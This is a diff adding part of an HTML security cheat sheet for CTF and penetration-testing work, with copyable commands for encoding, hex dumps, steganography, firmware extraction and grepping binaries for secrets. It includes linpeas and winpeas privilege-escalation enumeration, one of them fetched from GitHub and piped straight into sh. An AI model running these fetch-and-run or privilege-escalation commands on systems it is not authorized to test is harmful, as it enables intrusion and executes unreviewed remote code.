+        <div class="cmd-header">
+          <div><div class="cmd-title">Base64 — Encode/Decode</div><div class="cmd-desc">Shell one-liners</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">echo</span> <span class="fl">-n</span> <span class="str">"&lt;text&gt;"</span> <span class="p">|</span> <span class="kw">base64</span>    <span class="cm"># encode</span>
+<span class="kw">echo</span> <span class="str">"&lt;base64&gt;"</span> <span class="p">|</span> <span class="kw">base64</span> <span class="fl">-d</span>  <span class="cm"># decode</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">xxd — Hex dump / unhex</div><div class="cmd-desc">Binary to hex and back</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">xxd</span> <span class="var">&lt;file&gt;</span>              <span class="cm"># hex dump</span>
+<span class="kw">xxd</span> <span class="fl">-r -p</span> <span class="var">&lt;hex.txt&gt;</span>      <span class="cm"># hex to binary</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Misc -->
+  <div class="section-card" id="misc">
+    <h2><span class="emoji">🧰</span> Misc Utilities</h2>
+    <div class="cmd-grid">
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">linpeas — Linux privesc</div><div class="cmd-desc">Auto-enumeration script for Linux</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">curl</span> <span class="fl">-L</span> <span class="var">https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</span> <span class="p">|</span> <span class="kw">sh</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">winpeas — Windows privesc</div><div class="cmd-desc">Auto-enumeration for Windows</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">curl</span> <span class="fl">-L -o</span> <span class="var">winpeas.exe</span> <span class="var">https://github.com/peass-ng/PEASS-ng/releases/latest/download/winpeasx64.exe</span>
+<span class="fl">.\</span><span class="var">winpeas.exe</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">steghide</div><div class="cmd-desc">Extract hidden data from image</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">steghide</span> <span class="fl">extract -sf</span> <span class="var">image.jpg</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">binwalk</div><div class="cmd-desc">Extract files from firmware/binaries</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">binwalk</span> <span class="fl">--dd=".*"</span> <span class="var">firmware.bin</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+      <div class="cmd">
+        <div class="cmd-header">
+          <div><div class="cmd-title">strings</div><div class="cmd-desc">Extract readable text from binary</div></div>
+        </div>
+        <div class="cmd-body">
+          <pre><span class="kw">strings</span> <span class="var">&lt;file&gt;</span> <span class="p">|</span> <span class="kw">grep</span> <span class="fl">-i</span> <span class="str">"flag\|password\|secret"</span><button class="copy-btn" onclick="copyCmd(this)">copy</button></pre>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <p>cyber-cheatsheet &mdash; <a href="https://github.com/gnaixnaij/cyber-cheatsheet">GitHub</a> &mdash; Commands verified on Kali Linux. Use responsibly.</p>
+</footer>
+
+<script>
+function copyCmd(btn) {
+  const pre = btn.parentElement;
+  const text = pre.textContent.replace('copy', '').trim();
+  navigator.clipboard.writeText(text);
+  const orig = btn.textContent;
+  btn.textContent = '✓ copied';
+  setTimeout(() => { btn.textContent = orig; }, 1500);
+}
+</script>
+
+</body>
+</html>
